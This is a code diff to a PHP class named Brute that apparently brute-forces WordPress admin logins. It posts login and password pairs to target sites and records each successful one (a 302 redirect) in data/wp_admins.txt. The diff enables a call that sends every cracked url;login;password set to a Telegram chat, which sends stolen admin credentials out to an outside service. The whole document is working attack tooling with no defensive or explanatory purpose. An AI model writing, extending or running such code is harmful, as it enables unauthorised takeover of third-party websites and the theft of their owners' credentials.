@@ -33,31 +33,28 @@ class Brute
         $password = $this->passwordCheck($data, $login);
         $iteration = $this->checkIterator($data, $login, $password);
 
-        $log = new Logger('name');
+        if ($iteration) {
+            $log = new Logger('name');
 
-        $body = new FormBody;
-        $body->addField('log', $login);
-        $body->addField('pwd', $password);
+            $body = new FormBody;
+            $body->addField('log', $login);
+            $body->addField('pwd', $password);
 
-        $request = new Request($url, 'POST');
-        $request->setTcpConnectTimeout(2400);
-        $request->setBody($body);
+            $request = new Request($url, 'POST');
+            $request->setTcpConnectTimeout(2400);
+            $request->setBody($body);
 
-        $response = yield $this->client->request($request);
-        $originalResponse = $response->getOriginalResponse();
+            $response = yield $this->client->request($request);
+            $originalResponse = $response->getOriginalResponse();
 
 
-        if ($originalResponse->getStatus() === 302) {
-            print_r([
-                'url' => $url,
-                'login' => $login,
-                'password' => $password,
-            ]);
-            file_put_contents('data/wp_admins.txt', "{$url};{$login};{$password}" . PHP_EOL, FILE_APPEND);
+            if ($originalResponse->getStatus() === 302) {
+                $wp_admin = "{$url};{$login};{$password}";
+                file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL, FILE_APPEND);
 
-//                (new Telegram())->sendMessage($wp_admin);
+                (new Telegram())->sendMessage($wp_admin);
+            }
         }
-
     }
 
     public function checkIterator($data, $login, $password) {
